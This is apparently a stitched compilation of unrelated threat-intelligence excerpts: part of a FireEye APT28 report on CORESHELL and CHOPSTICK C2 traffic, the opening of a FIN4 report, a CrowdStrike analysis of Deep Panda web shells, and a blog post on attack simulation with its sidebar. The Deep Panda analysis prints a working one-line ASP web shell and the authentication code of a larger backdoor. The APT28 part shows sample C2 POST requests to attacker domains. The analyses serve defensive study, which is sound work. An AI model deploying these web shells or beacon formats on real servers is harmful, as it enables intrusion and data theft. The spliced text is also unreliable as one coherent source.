APT28™s malware, we noted two details consistent across malware samples. The first was that APT28 had consistently compiled Russian language settings into their malware. The second was that malware compile times from 2007 to 2014 corresponded to normal business hours in the UTC + 4 time zone, which includes major Russian cities such as Moscow and St. Petersburg. Use of Russian and English Language Settings in PE ResourcesPE resources include language information that can be helpful if a developer wants to show user interface items in a specific language.25 Non-default language settings packaged with PE resources are dependent on the developer™s build environment. Each PE resource includes a ﬁlocaleﬂ identifier with a language ID ﬁcomposed of a primary language identifier indicating the language and a sublanguage identifier indicating the country/region.ﬂ 26 At the time of the writing of this paper, we had identified 103 malware samples that were both attributed to APT28 and contained PE resources.

We started researching APT28 based on activity we observed on our clients™ networks, similar to other targeted threat groups we have identified over time. We assess that APT28 is most likely sponsored by the Russian government. We summarize our key observations about APT28 in Figure 11 below. APT28™s characteristicsŠtheir targeting, malware, language, and working hoursŠhave led us to conclude that we are tracking a focused, long- standing espionage effort. Given the available data, we assess that APT28™s work is sponsored by the Russian government.

These individuals may share the same set of tasks, coordinate targets, and share tools and methodology. They work together to gain access to their targets and steal data.The art of attributing disparate intrusion activities to the same threat group is not always simple. Different groups may use similar intrusion methodologies and common tools, particularly those that are widely available on the Internet, such as pwdump, HTran, or Gh0st RAT. There may be overlaps between groups caused by the sharing of malware or exploits they have authored, or even the sharing of personnel. Individual threat actors may move between groups either temporarily or permanently. A threat actor may also be a private citizen who is hired by multiple groups. Multiple groups, on occasion, compromise the same target within the same timeframe. Distinguishing one threat group from another is possible with enough information, analytical experience, and tools to piece it all together. We can analyze multiple incidents and tell by the evidence left behind that a given incident was the result of one threat group and not another. Threat actors leave behind various forensic details. They may send spear phishing emails from a specific IP address or email address. Their emails may contain certain patterns; files have specific names, MD5 hashes, timestamps, custom functions, and encryption algorithms. Their backdoors may have command and control IP addresses or domain names embedded. These are just a few examples of the myriad of forensic details that we consider when distinguishing one threat group from another. At the most basic level, we say that two intrusion events are attributed to the same group when we have collected enough indicators to show beyond a reasonable doubt that the same actor or group of actors were involved. We track all of the indicators and significant linkages associated with identified threat groups in a proprietary database that comprises millions of nodes and linkages between them. In this way, we can always go back and answer ﬁwhyﬂ we associated cyber threat activity with a particular group. 30 fireeye.com APPENDIX B: TIMELINE OF APT28 LURESYEARLURE TOPICMALWARE 2010Iran™s work with an international organization (internal document) SOURFACE 2011File named ﬁmilitary cooperation.docﬂSOURFACE, OLDBAIT2011Georgian language IT document for Ministry of Internal Affairs (internal document) SOURFACE 2011ﬁUSB Disk Security is the best software to block threats that can damage your PC or compromise your personal information via USB storage.ﬂSOURFACE 2012Food security in Africa (ﬁFood and nutrition crisis reaches peak but good forecast for 2013ﬂ) SOURFACE 2012ﬁIDF Soldier Killed and another injured in a Terror Attackﬂ SOURFACE 2012ﬁEcho Crisis Reportﬂ on Portugal™s forest fires SOURFACE 2012ﬁFBI to monitor Facebook, Twitter, Myspaceﬂ SOURFACE 2012Georgia (US state, not the country of Georgia) murder case uncovers terror plot SOURFACE 2012Military attaches in London (internal document) SOURFACE 2013South Africa MFA document CHOPSTICK, CORESHELL2013John Shalikashvili (Georgian-Polish-American US General) Questionnaire CORESHELL2013Asia Pacific Economic Cooperation Summit 2013 reporters (internal document) SOURFACE 2013Defense Attaches in Turkey (internal document) CHOPSTICK, CORESHELL2013Turkish Cypriot news about Syria chemical weapons CHOPSTICK, CORESHELL2013Georgian language document about drivers™ licenses (internal document) EVILTOSS 2013Apparent Reason Magazine-related lure sent to a journalist CORESHELL2014Mandarin language document, possibly related to a Chinese aviation group (non-public document) CORESHELL2014Netherlands-Malaysia cessation of hostilities; related to Ukraine airline attack CORESHELL 31 fireeye.com SOURFACE is a downloader that obtains a second stage backdoor from a C2 server. Over time the downloader has evolved and the newer versions, usually compiled with the DLL name ‚coreshell.dll™, are distinct enough from the older versions that we refer to it as SOURFACE/CORESHELL or simply CORESHELL. This appendix focuses on these newer versions. CORESHELL uses two threads to communicate with its C2 server. The first thread sends beacons that contain the process listing of the compromised host. The second thread is responsible for downloading and executing stage APPENDIX C: SOURFACE/CORESHELL two payloads. Messages are sent using HTTP POST requests whose bodies contain encrypted and Base64 encoded data. The encryption algorithm is a custom stream cipher using a six-byte key. Commands from the controller to the CORESHELL implant are encrypted using another stream cipher but this time using an eight-byte key. CORESHELL has used the same user agent string (ﬁMSIE 8.0ﬂ) that SOURFACE previously used, but in more recent samples CORESHELL uses the default Internet Explorer user agent string obtained from the system. Figure 11 shows an example POST request.

The first byte of the command message specifies the command type and is immediately followed by the PE or shellcode to be executed. In this example the command byte is 04 indicating the following bytes are shellcode. If the command byte was 01, 02, or 03 the following bytes would be a DLL or EXE that would be written to disk and executed.

This framework allows for a diverse set of capabilities across malware variants sharing a common code base. CHOPSTICK may communicate with external servers using SMTP or HTTP. This appendix documents variants using HTTP communications. The first time CHOPSTICK is executed, it may encrypt and store configuration data in the Registry key HKU\\\\S-1-5-19_Classes\\\\Software\\\\Microsoft\\\\MediaPlayer\\\\{E6696105-E63E-4EF1-939E-15DDD83B669A}\\\\chnnl. The user HKU\\\\S-1-5-19 corresponds to the LOCAL_SERVICE account SID. The configuration block is encrypted using RC4 encryption. The key is a combination of a 50-byte static key and a four-byte salt value randomly generated at runtime. The static key is derived from opcodes in the backdoor. CHOPSTICK collects detailed information from the host including the Windows version, CPU architecture, Windows Firewall state, User Account Control (UAC) configuration settings on Windows Vista and above and Internet Explorer settings. It also tests for the installation of specific security products (Table 9) and applications (Table 10).

It creates a thread that records user activity on the host, capturing desktop screenshots in JPEG format, tracks current window focus, collects keystrokes, and scrapes window contents (text, context menus, etc.). User activity is captured once every 500 milliseconds and logged in an HTML-like format. The thread writes user activity log messages to the ﬁ check_mes_v5555ﬂ mailslot in plain text. CHOPSTICK reads messages from the mailslot, encrypts them using RC4, and then stores the encrypted message in an edg6EF885E2.tmp temporary file. The RC4 encryption used here also uses a 50- byte static key plus four-byte random salt value. After approximately 60 seconds of execution time, CHOPSTICK begins communicating with one of its C2 servers over HTTP. After sending an initial HTTP GET request it uploads the file contents of edg6EF885E2. tmp to the C2 server using HTTP POST requests. It does not wait for a response from the server to begin uploading. Once the contents of edg6EF885E2.tmp are uploaded, CHOPSTICK deletes the file. Figure 13 below contains an example of an HTTP POST request uploading a segment from edg6EF885E2.tmp. Figure 13: Sample CHOPSTICK v2 HTTP POST POST /search/?btnG=D-3U5vY&utm=79iNI&ai=NPVUnAZf8FneZ2e_qptjzwH1Q&PG3pt=n-B9onK2KCi HTTP/1.1 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*;q=0.8 Accept-Language: en-us,en;q=0.5 Accept-Encoding: gzip, deflate User-Agent: Mozilla/5.0 (Windows NT 6.; WOW64; rv:20.0) Gecko/20100101 Firefox/20.0 Host: windows-updater.com Content-Length: 77 Cache-Control: no-cache1b2x7F4Rsi8_e4N_sYYpu1m7AJcgN6BzDpQYv1P2piFBLBqghXiHY3SIfe8cUHHYojeXfeyyOhw==28A mailslot is a Windows inter-process communication (IPC) mechanism similar to a named pipe, but is designed for one-way communications between processes and can also be used across the network. 38 fireeye.com CHOPSTICK uses a URL-safe Base64 encoding, using an alphabet that substitutes ﬁ+ﬂ and ﬁ/ﬂ for ﬁ-ﬂ and ﬁ_ﬂ, respectively. Each HTTP request contains multiple Base64 encoded URL parameters, however only one parameter contains information encoded by the malware (ﬁai=ﬂ) and the rest of the URL parameters appear to be randomly generated per request. CHOPSTICK encrypts an 11-byte sequence in the ﬁai=ﬂ parameter. The purpose of this parameter appears to be to uniquely identify the particular instance of the backdoor to the C2 server. The Base64 encoded text of this parameter begins with a number of randomly generated alphabetical characters presumably intended to prevent people from Base64 decoding the whole string without some knowledge of how the malware family works. The first four bytes of the message are an XOR key for the remainder of the data. Once decrypted using the XOR key, an 11-byte sequence is revealed. The first seven bytes are static, and are hard-coded in CHOPSTICK, while the last four bytes appear to be unique. The message body of the POST request is also Base64 encoded. This encoded string is also prefixed with random characters designed to break the output of a Base64 decode operation on the entire string. The first 15 bytes of the decoded message body comprise another 11-byte sequence similar to the sequence stored in the ﬁai=ﬂ parameter as described above. Decrypting these bytes yields another static seven-byte sequence, followed by four unique bytes. The remainder of the message body consists of the RC4 encrypted data containing the HTML-formatted user activity log, edg6EF885E2.tmp. After uploading edg6EF885E2.tmp, CHOPSTICK continues to query its C2 servers for commands using HTTP GET requests. The malware contains code which allows it to load or memory-map external modules that export the following functions: SendRawPacket, GetRawPacket, InitializeExp, DestroyExp, IsActiveChannel, GetChannelInfo, SetChannelInfo, Run, GetModuleInfo, GiveMessage, and TakeMessage. 39 fireeye.com ModularityCHOPSTICK backdoors are compiled within a modularized development framework. This means that two separate CHOPSTICK backdoors may contain vastly different functionality, depending on which modules were included at compile time. The modules that are included in an instance of CHOPSTICK may be reported to the C2 server as part of POST messages. Figure 14 includes an example from a CHOPSTICK v1 variant:Figure 14: Sample CHOPSTICK v1 HTTP POST including module identificationPOST /webhp?rel=psy&hl=7&ai=d2SSzFKlR4l0dRd_ZdyiwE17aTzOPeP-PVsYh1lVAXpLhIebB4= HTTP/1.1 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: en-us,en;q=0.5 Accept-Encoding: gzip, deflate User-Agent: Mozilla/5.0 (Windows NT 6.; WOW64; rv:20.0) Gecko/20100101 Firefox/20.0 Host: adobeincorp.com Content-Length: 71 Cache-Control: no-cached2SSzFKchH9IvjcM55eQCTbMbVAU7mR0IK6pNOrbFoF7Br0Pi__0u3Sf1Oh30_HufqHiDU= 40 fireeye.com To decode the POST content, the first step is to remove characters from the Base64 string (the number of characters to remove may vary between different communication channels). In the example from Figure 14, the number of characters removed is seven. Once these characters are removed the decoded (but still encrypted) text looks like this: 00000000 72 11 fd 22 f8 dc 33 9e 5e 40 24 db 31 b5 40 53 r..ﬂ..3.^@$.1.@S 00000010 b9 91 d0 82 ba a4 d3 ab 6c 5a 05 ec 1a f4 3e 2f ........lZ....>/ 00000020 ff d2 ed d2 7f 53 a1 df 4f c7 b9 fa 87 88 35 .....S..O.....5The first two words (ﬁ72 11ﬂ and ﬁfd 22ﬂ) are checksums that are used to validate the message. The next 4 bytes ﬁf8 dc 33 9eﬂ are a salt value that is appended to the end of an RC4 key. Once decrypted, the message looks like the following: 00000000 72 11 fd 22 f8 dc 33 9e 56 34 4d 47 4e 78 5a 57 r..ﬂ..3.V4MGNxZW 00000010 6c 76 63 6d 68 6a 4f 47 39 79 5a 51 3d 3c 3c ee lvcmhjOG9yZQ=<<. 00000020 01 00 00 01 00 23 01 10 23 01 11 23 01 13 23 .....#..#..#..#The strings ﬁV4MGNxZWlvcmhjOG9yZQﬂ and ﬁ=<<\\\\xeeﬂ are hardcoded in the implant.

The corresponding modules in each backdoor also are consistently identified with 0x01 and 0x02, respectively, in the second byte. In both variants the modules with keystroke log, file system access, and command shell capabilities have the consistent identifiers 0x10, 0x11, and 0x13, respectively, in the first byte. This suggests that the first byte in the module ID identifies the module type whereas the second byte identifies the kernel version. The kernel sends commands to each module using its module ID.

The media echoes these two objectives daily in news stories about Eastern European cybercriminals stealing payment card data from retailers, or China-based threat groups targeting high tech firms\\' latest innovations. A reader skimming the headline, \"Hackers Steal Data from Pharmaceutical Firms\" could be forgiven for assuming that the article tells the story of a government-backed group in pursuit of new drug innovations. However, in a campaign FireEye is uncovering today, this headline tells another story.\\nFireEye tracks a threat group that we call \"FIN4,\" whose intrusions seem to have a different objective: to obtain an edge in stock trading. FIN4 appears to conduct intrusions that are focused on a single objective: obtaining access to insider information capable of making or breaking the stock prices of public companies. The group specifically targets the emails of C-level executives, legal counsel, regulatory, risk, and compliance personnel, and other individuals who would regularly discuss confidential, market-moving information.\\nFIN4 has targeted over 100 companies since at least mid-2013. All of the targeted organizations are either public companies or advisory firms that provide services to public companies (such as investor relations, legal, and investment banking firms). Over two-thirds of the targeted organizations are healthcare and pharmaceutical companies. FIN4 probably focuses on these types of organizations because their stocks can move dramatically in response to news of clinical trial results, regulatory decisions, or safety and legal issues.\\nWe\\'ve been able to characterize FIN4\\'s activity via our incident response engagements, FIN4\\'s attempts to compromise our managed service clients, our product detection data, and further independent research. Our visibility into FIN4\\'s activities is limited to its network operations; we can only surmise how they may be using and potentially benefitting from the valuable information they are able to obtain. However, one fact remains clear: access to insider information that could significantly impact stock prices for dozens of publicly traded companies surely puts FIN4 at a considerable trading advantage.\\nFireEye is releasing indicators to help organizations detect FIN4 activity.

The series will culminate with a CrowdCast in April 2014 detailing a case study of the incident response investigation conducted to identify these web shells. Special thanks to Josh Phillips of the CrowdStrike Global Intelligence Team for providing the technical analysis in this blog post.\\nToday we’ll cover part one of this series, which provides an overview of what web shells are, functionality of two web shells recently identified during an incident response investigation and how they were leveraged by the attacker.\\nParts two through four will provide details on successful analytical techniques you can use to discover web shells within your environment:\\nMo’ Shells Mo’ Problems: Deep Panda Web Shells (Part 1)\\nMo’ Shells Mo’ Problems: File Stacking (Part 2)\\nMo’ Shells Mo’ Problems: Web Log Review (Part 3)\\nMo’ Shells Mo’ Problems: Network Detection (Part 4)\\nA Web Shell is a file containing backdoor functionality written in a web scripting language such ASP, ASPX, PHP or JSP.\\xa0 When a web shell is hosted on an internet facing victim system, an adversary can remotely access the system to perform malicious actions.\\xa0 Deep Panda is a China based threat group CrowdStrike has observed targeting companies in the defense, legal, telecommunication and financial industries.\\xa0 Crowdstrike has observed Deep Panda adopting web shells as their primary access back into a victim organization.\\xa0 This is an interesting shift as web shells have typically been seen as only a first stage into obtaining a persistent foothold in an environment.\\xa0 Previously, web shells were quickly abandoned once persistent second stage malware was successfully beaconing.\\xa0 Using a web shell as a primary backdoor gives Deep Panda several advantages:\\nLow to virtually no detection by antivirus products\\nThe absence of command and control beacon traffic\\nImpossible to block known malicious IP addresses to a web server since adversary can easily change their source IP address\\nCookie and HTTP header authentication aware web shells avoid being enumerated by search engines and restrict access, further reducing their network footprint\\nTo assist organizations with identifying web shells in their environment, this post will cover two popular Deep Panda web shells.\\xa0 By gaining insight into their capabilities and footprint, organizations should find it feasible to detect and remediate these backdoors.\\nShowimg.asp\\nPath:\\nE:inetpubwwwroot<Redacted>\\nMD5 Hash:\\nffa82c64720179878b25793f17b304d7\\nFile Size:\\n28\\nTable 1: “Showimg.asp” Metadata\\nShowimg.asp is an example of an early stage web shell used to build an initial foothold within a network.\\xa0 After it is replaced by more robust backdoors, it may be left in place as a last resort should remediation take place.\\xa0 At a diminutive 28 bytes, it is one of the smallest Active Server Page (ASP) backdoors in the wild.\\xa0 In a recent case, we witnessed this web shell written to a standalone file (named showimg.asp), but it could easily be injected into an existing page, making it even stealthier.\\xa0 The code for this web shell can be found below:\\n<%execute request(chr(42))%>\\nTable 2: “Showimg.asp” Web Shell Script\\nASP uses Microsoft Visual Basic (VBScript) as its implementation language.\\xa0 The code above uses the chr() function to convert an integer into a character, which is then passed as an argument to the ASP Request() object.\\nThe Request() object will search the Query String for any keys matching the input.\\xa0 In our case, the code is equivalent to Request.QueryString(‘*’).\\xa0 The request object will look for chr(42) which is an asterisk (*), returning whatever is passed to it in a HTTP GET or POST.\\nNext, the Execute() function will execute any value returned by the lookup.\\xa0 Effectively, an attacker can form a request that will execute any VBScript code.\\xa0 As you might imagine, this is a powerful capability.\\xa0 For example, this code can perform any of the following actions:\\nFile upload or download\\nFile system read, write, or delete\\nArbitrary command execution\\nThis web shell is an example of a “thick client” shell, meaning that while the server side code is quite small, attackers typically use a larger GUI client to construct the sent commands.\\xa0 The client GUI runs on the attacker’s system and hence is not typically found within the victim network.\\nAs a simple example of an encoded command, the following GET request would cause the backdoor to execute the code Response.Write(“<h1>Hello World</h1>”) and would render “Hello World” to be printed in the web browser:\\nhttp://<webserver>/showimage.asp*=%52%65%73%70%6F%\\n6E%73%65%2E%57%72%69%74%65%28%22%3C%68%31%3E%48%65\\n%6C%6C%6F%20%57%6F%72%6C%64%3C%2F%68%31%3E%22%29\\nTable 3: “showimg.asp” Web Shell Script\\nSystem_web.aspx\\nPath:\\nC:inetpubwwwrootaspnet_clientsystem_web<VERSION>\\nMD5 Hash:\\ncc875db104a602e6c12196fe90559fb6\\nFile Size:\\n45187\\nTable 4: Metadata of “system_web.aspx”\\nSystem_web.aspx is an excellent example of a more robust web shell used to replace Deep Panda’s traditional beaconing command and control infrastructure.\\xa0 It is an ASP.NET backdoor written in C#, with far more capabilities than we saw with the showimage.asp sample.\\nThe web shell supports a form of authentication to protect against unauthorized access.\\xa0 This prevents its discovery from search engine indexing, vulnerability scanning tools and other unauthorized access to the backdoor.\\xa0 In order to bypass authentication, a user session must satisfy one of three options:\\nPass a cookie with the name <Redacted>\\nSet the Keep-Alive HTTP header to 320\\nSet language HTTP header to contain es-DN\\nSince web shells are text-based, we can easily see how this authentication takes place:\\ntry\\n{\\nInit();\\nif (!IsUserValid())\\n{\\ntry\\n{\\nint.Parse(Request.Cookies[“REDACTED”].Value);\\nPage.Visible = true;\\n}\\ncatch (Exception)\\n{\\nPage.Visible = false;\\nResponse.Clear();\\nResponse.End();\\n}\\n}\\nelse\\n{\\nPage.Visible = true;\\nResponse.SetCookie(new HttpCookie(“REDACTED”, DateTime.Now.Second.ToString()));\\n}\\n}\\ncatch (Exception)\\n{\\nPage.Visible = false;\\nResponse.End();\\n}\\nprivate void Init()\\n{\\ntry\\n{\\nif (Request.Cookies[“cp”] != null)\\n{\\nFile.Copy(Request.PhysicalPath, Request.Cookies[“cp”].Value, true);\\nResponse.Cookies[“cp”].Expires = DateTime.Now.AddDays(-1);\\nResponse.End();\\n}\\n}\\ncatch (Exception ex)\\n{\\nLog(ex.ToString());\\n}\\n}\\nprivate bool IsUserValid()\\n{\\ntry\\n{\\nif (Request.Headers[“Keep-Alive”] == “320”)\\nreturn true;\\nif (Request.UserLanguages.Length > 0)\\n{\\nforeach (string s in Request.UserLanguages)\\n{\\nif (s.IndexOf(“es-DN”) >= 0)\\nreturn true;\\n}\\n}\\n}\\ncatch (Exception)\\n{\\nreturn false;\\n}\\nreturn false;\\n}\\nTable 5: “system_web.aspx” Authentication Code\\nFirst, the code checks if a cookie by the name of cp exists. If so, the response object has its End() method invoked, denying the user access.\\xa0 Next, the code uses the IsValidUser()method and checks the Hyper Text Transport Protocol (HTTP) headers for the Keep-Alive value, which, if equal to 320, will return true. If the value does not equal 320 the IsValidUser()method iterates over the Request.UserLanguages collection searching for a language named es-DN, and if found, the IsValidUser() method will return true. If neither check passes, the code returns false and the code will finally check for the presence of a cookie named <REDACTED>. If the cookie is present, the authentication step is satisfied.\\xa0 If not, a blank web page with no content is displayed.\\nAfter successful authentication, the attacker is provided with the following page:\\nSystem_web.aspx packs a large amount of functionality into a compact interface.\\xa0 It provides the following capabilities:\\nEnumerate attached drives\\nUtilize built in SQL functions to connect to database backend\\nRun SQL queries and statements\\nDownload, upload and read files\\nDirectory listing\\nExecute Active Directory requests\\nCompile and execute arbitrary C# source code\\nImpersonate a user\\nThe web shell supports 8 main commands, with most command execution via Transact-SQL using the xp_cmdshell function.\\nExec\\nThis command depends on the contents of the first unlabeled textbox1. If unlabeledtextbox1 is empty, the code will enumerate attached drives.\\nProvider= or Driver= – Will connect using the OleDbConnection class.\\nData Source= – The code will connect using the SqlConnection class.\\niis:// – If this appears in unlabeled textbox1, the code will use data from the second unlabeled textbox2 to execute Active Directory requests.\\nDown\\nThis command also depends on the text contained in the unlabeled textbox1. If the\\xa0field is left empty, the code will assume a valid path to a file on the local machine and will read and display contents to user.\\nData Source=\\xa0– the code will assume that the unlabeled textbox2 contains a valid SQL query and will execute it and display the results.\\nhttp:// – If this appears in unlabeled textbox1, download content from the assumed URL.\\n$SEX – If this appears in unlabeled textbox1, pass the contents to the Server.Execute() method.\\nBF\\nExecute contents in unlabeled textbox1 as a SQL query and return binary data to adversary.\\nGF\\nExecute contents in unlabeled textbox1 as a SQL statement and return valid textual data to adversary.\\nTF\\nUpload the file chosen by the Choose File button and save it to a temporary table in the database file worktbl in chunks of 10240 bytes. Then executes xp_cmdshell (which executes the Bulk Copy Program) to copy the data from that table to a file whose name is specified in unlabeled textbox2. After the file is saved, the code deletes the temporary table.\\nRF\\nIf unlabeled textbox1 is a local file on infected system, the file is read and displayed to attacker.\\n\\\\ – If unlabeled textbox1 starts with \\\\, use xp_cmdshell to execute the copy command to copy file to %windir%Temptemp.bin. Then, issue the dir command and display results to user. Finally, delete the temporary file %windir%Temptemp.bin.\\nDIR\\nPerform Active Directory queries. The code handles create, delete, set, get, and enum queries, while any query not matching those is executed directly. All commands are executed using the System.DirectoryServices API.\\nEva\\nSimple wrapper around the CSharpCodeProvider API, allowing the adversary to compile and execute arbitrary C# source code.\\nLogin Checkbox\\nAttempt to use the username, password, and domain from the User, Pass and Domain fields and LogonUserA() Win32 API function to impersonate a specific user.\\nDetatch Checkbox\\nSpecifies whether commands run from the Exec button will have their output redirected and displayed to the adversary when the command is finished executing.\\nIn short, system_web.aspx provides an adversary with a very stealthy means of near full control of the server on which it resides.\\xa0 This stealth might be its most important attribute.\\xa0 As we will see, identifying web shells can be much harder than finding malicious binaries. In our next post, we will discuss techniques for identifying web shells.\\nStay tuned for Parts 2-4 as we cover File Stacking, Web Log Review, and Network Detection.

Especially determined, well funded and well equipped attackers. We know roughly HOW they are getting in which is usually via a targeted Phish, SQLinjection, malicious URL, etc. Things that are hard to defend against because they depend on a human element or trust partnerships between organizations.\\nWhat we don\\'t think about is the fact that our Incident Response and detection teams don\\'t get exercised sufficiently (or ever) which makes them much less effective than they could be. We also don\\'t think about modeling and understanding what real attack traffic looks like so we can tune our defenses against it. REAL traffic, not Nessus scans or CoreImpact exploits.\\nHow can we know that our people and systems are actually able to detect the types of attacks we really care about if we don\\'t know what each attack looks like in every data source we have. Is there a windows event log entry reflecting a change in service\\xa0permissions? Can the timing pattern in the call home beacon be seen in net flow? What does an exfil file hidden in the recycle bin via user SID look like, and is it visible?\\nIf you know all the malicious inputs to the system ahead of time, then you can determine all the data sources you have that show indicators that something has\\xa0happened, rather than waiting until an attack happens to attempt to track it all back and hope for the best.\\nThis subject is a bit more tricky so lets approach it first with an example. Using HERMES, we analyzed some samples and activity from a group of APT actors that we call \"UPS\". The typical UPS attack performed the following activities (this information was compiled from IR activity and shared data from other victims):\\nGenerate a particularly timed beacon that communicates over HTTP\\nDrop the command line Chinese language version of \\xa0winrar on the target\\nReplace sticky keys with cmd.exe for persistence and access via RDP\\nTurn on RDP if it\\'s not already enabled\\nIndex and archive all office documents, compress and encrypt them with RAR and a specific password and store them in the recycle bin\\nEnable the\\xa0support_388945a0 account and add it to the local admin group\\nExfiltrate the data encoded over port 443 (but not SSL)\\nSetup an insecure service for persistence /\\xa0privilege\\xa0escalation\\nThat is a fairly comprehensive list of attacker activity and each action generates either specific network traffic, log entries, and files on the target. So what we do with APTSim is to take all the above information and create a piece of\\xa0pseudo-malware that takes the same actions, except in a safe and controlled manner, and includes cleanup components so it can be removed when the exercise is complete.\\nCustomers have different preferences as to how we take the next step but generally one of a few options is commonly used:\\nAR has VPN access to the customer network\\nAR has shipped a special box which the customer plugs into their network\\nAR conducts a physical penetration to launch the APTSim via a malicious USB key, custom developed Teensy, or other hardware implanted in customer equipment\\nAR generates a targeted phish mirroring the initial vector used by the original actors whether that\\'s a malicious attachment or a URL, etc.\\nThe customer executes the APTSim model themselves\\nThe APTSim model then connects back to our command & control center, takes all the same actions as the real attacker, exfiltrates data and then the customer is notified of what activity took place. The notification is a short document contains log entry examples, PCAP examples, time and dates, ports used, in short\\xa0everything\\xa0that is needed to detect the activity as well as track it back post event.\\nIf the attack simulation is not detected then AR will assist you in tuning your\\xa0defenses\\xa0whether\\xa0that means new rules for your Cisco ASA\\'s, custom ClamAV or Snort signatures, specialized Splunk apps, etc.\\nRather than a barely useful once a year event, this process is ongoing,\\xa0monthly\\xa0or as new attacks are found and analyzed. When one of the organizations in your business sector is hit, within a very short period of time you know the crucial details of the attack, are tested to see if it could hit you as well, and finally are ready to defend before the attackers come for you. This is being proactive rather than reactive.\\nFor more information hit up info [at] attackresearch.com.\\nV.\\nvalsmith\\n/\\n12:53 PM\\n/\\nShare Post\\nvalsmith\\nNo comments:\\nPost a Comment\\nNewer Post\\nOlder Post\\nHome\\nSubscribe to:\\nPost Comments (Atom)\\nTweets\\nTweets from https://twitter.com/carnal0wnage/lists/blog-authors\\nBlog Archive\\n►\\n2020\\n(2)\\n►\\nApril\\n(1)\\n►\\nMarch\\n(1)\\n►\\n2019\\n(24)\\n►\\nDecember\\n(1)\\n►\\nMay\\n(2)\\n►\\nMarch\\n(3)\\n►\\nFebruary\\n(7)\\n►\\nJanuary\\n(11)\\n►\\n2018\\n(2)\\n►\\nNovember\\n(1)\\n►\\nFebruary\\n(1)\\n►\\n2017\\n(16)\\n►\\nNovember\\n(1)\\n►\\nAugust\\n(2)\\n►\\nJune\\n(5)\\n►\\nMay\\n(1)\\n►\\nMarch\\n(1)\\n►\\nJanuary\\n(6)\\n►\\n2016\\n(13)\\n►\\nDecember\\n(1)\\n►\\nNovember\\n(1)\\n►\\nAugust\\n(2)\\n►\\nJune\\n(1)\\n►\\nMay\\n(2)\\n►\\nMarch\\n(2)\\n►\\nFebruary\\n(1)\\n►\\nJanuary\\n(3)\\n►\\n2015\\n(31)\\n►\\nDecember\\n(2)\\n►\\nNovember\\n(2)\\n►\\nSeptember\\n(3)\\n►\\nAugust\\n(1)\\n►\\nJune\\n(1)\\n►\\nMay\\n(3)\\n►\\nApril\\n(2)\\n►\\nMarch\\n(6)\\n►\\nFebruary\\n(6)\\n►\\nJanuary\\n(5)\\n►\\n2014\\n(10)\\n►\\nDecember\\n(1)\\n►\\nOctober\\n(2)\\n►\\nJune\\n(1)\\n►\\nMay\\n(2)\\n►\\nMarch\\n(2)\\n►\\nFebruary\\n(1)\\n►\\nJanuary\\n(1)\\n►\\n2013\\n(22)\\n►\\nDecember\\n(3)\\n►\\nOctober\\n(2)\\n►\\nSeptember\\n(3)\\n►\\nAugust\\n(1)\\n►\\nJuly\\n(3)\\n►\\nMay\\n(2)\\n►\\nApril\\n(3)\\n►\\nMarch\\n(3)\\n►\\nJanuary\\n(2)\\n▼\\n2012\\n(53)\\n►\\nDecember\\n(3)\\n►\\nNovember\\n(5)\\n►\\nOctober\\n(11)\\n▼\\nSeptember\\n(6)\\nAntibiotic Resistant security\\nMore on APTSim\\nHERMES\\nAttack Research Product Launch\\nPwn Plug Elite Action Shots\\nWhy We Created Offensive Techniques\\n►\\nAugust\\n(2)\\n►\\nJune\\n(2)\\n►\\nMay\\n(12)\\n►\\nApril\\n(6)\\n►\\nMarch\\n(1)\\n►\\nFebruary\\n(3)\\n►\\nJanuary\\n(2)\\n►\\n2011\\n(50)\\n►\\nDecember\\n(5)\\n►\\nNovember\\n(8)\\n►\\nOctober\\n(3)\\n►\\nSeptember\\n(3)\\n►\\nAugust\\n(1)\\n►\\nJuly\\n(3)\\n►\\nJune\\n(5)\\n►\\nMay\\n(8)\\n►\\nApril\\n(3)\\n►\\nMarch\\n(4)\\n►\\nFebruary\\n(3)\\n►\\nJanuary\\n(4)\\n►\\n2010\\n(54)\\n►\\nDecember\\n(2)\\n►\\nNovember\\n(4)\\n►\\nOctober\\n(1)\\n►\\nSeptember\\n(3)\\n►\\nAugust\\n(1)\\n►\\nJuly\\n(6)\\n►\\nJune\\n(4)\\n►\\nMay\\n(9)\\n►\\nApril\\n(7)\\n►\\nMarch\\n(5)\\n►\\nFebruary\\n(4)\\n►\\nJanuary\\n(8)\\n►\\n2009\\n(125)\\n►\\nDecember\\n(7)\\n►\\nNovember\\n(10)\\n►\\nOctober\\n(12)\\n►\\nSeptember\\n(20)\\n►\\nAugust\\n(3)\\n►\\nJuly\\n(1)\\n►\\nJune\\n(2)\\n►\\nMay\\n(9)\\n►\\nApril\\n(12)\\n►\\nMarch\\n(9)\\n►\\nFebruary\\n(23)\\n►\\nJanuary\\n(17)\\n►\\n2008\\n(169)\\n►\\nDecember\\n(5)\\n►\\nNovember\\n(14)\\n►\\nOctober\\n(19)\\n►\\nSeptember\\n(4)\\n►\\nAugust\\n(16)\\n►\\nJuly\\n(15)\\n►\\nJune\\n(19)\\n►\\nMay\\n(19)\\n►\\nApril\\n(10)\\n►\\nMarch\\n(23)\\n►\\nFebruary\\n(16)\\n►\\nJanuary\\n(9)\\n►\\n2007\\n(73)\\n►\\nDecember\\n(14)\\n►\\nNovember\\n(6)\\n►\\nOctober\\n(7)\\n►\\nSeptember\\n(9)\\n►\\nAugust\\n(7)\\n►\\nJuly\\n(14)\\n►\\nJune\\n(5)\\n►\\nMay\\n(11)\\nLinks\\nAttack Research\\ncarnal0wnage On Slideshare\\ncarnal0wnage Vimeo Channel\\ncarnal0wnage\\nNoVA Hackers\\nRecent Posts\\nPopular Posts\\nRecent Posts\\n￼￼￼￼￼￼￼￼￼\\nPopular Posts\\nsqlmap with POST requests\\nNotes for sqlmap and POST requests since every f**king tutorial only covers GETs\\noptions you\\'ll want to use\\n-u URL, --url=URL <-- T...\\nEnumerating user accounts on Linux and OS X with rpcclient\\nYeah so i was bored on the hotel wireless...errr lab...and started seeing who had ports 135, 139, 445 open.\\nI found one guy running OS X 10...\\nCertutil for delivery of files\\nQuick post putting together some twitter awesomeness\\nreferences:\\nhttps://twitter.com/subtee/status/888125678872399873\\nhttps://twitter.co...\\nSNMP enumeration with snmpenum and snmpwalk\\nOver in LSO-Chat we were talking about SNMP\\nEnumeration\\nand why you would want to do that and what kind of information you could pull from...\\nSQLMap -- Searching Databases for Specific Columns/Data & Extracting from Specific Columns\\nSo assuming we have some sort of SQL Injection in the application (Blind in this case) and we\\'ve previously dumped all the available dat...\\nKubernetes: Master Post\\nI have a few\\xa0Kubernetes posts queued up and will make this the master post to index and give references for 